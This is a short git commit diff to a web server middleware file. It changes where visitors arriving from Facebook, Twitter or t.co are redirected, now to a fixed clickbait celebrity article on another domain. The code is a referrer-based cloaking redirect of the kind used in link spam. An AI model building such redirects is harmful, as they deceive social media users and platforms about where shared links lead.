906facadf2d30367a63a4dc351e7f9add3c03e49
1stmaidinh <117885095+1stmaidinh@users.noreply.github.com>
2023-04-14 12:19:47 +0700

    Update [...slug].ts

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -2,6 +2,6 @@ export default defineEventHandler((event) => {
     const headers = event.req.headers;
     
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        sendRedirect(event,"https://zeen.wiki/"+event.req.url);
+        sendRedirect(event,"https://zooms.wiki/sexy-kylie-jenners-skin-skimpy-pics-in-a-plunging-corset-will-make-you-sweat/");
     }
 })
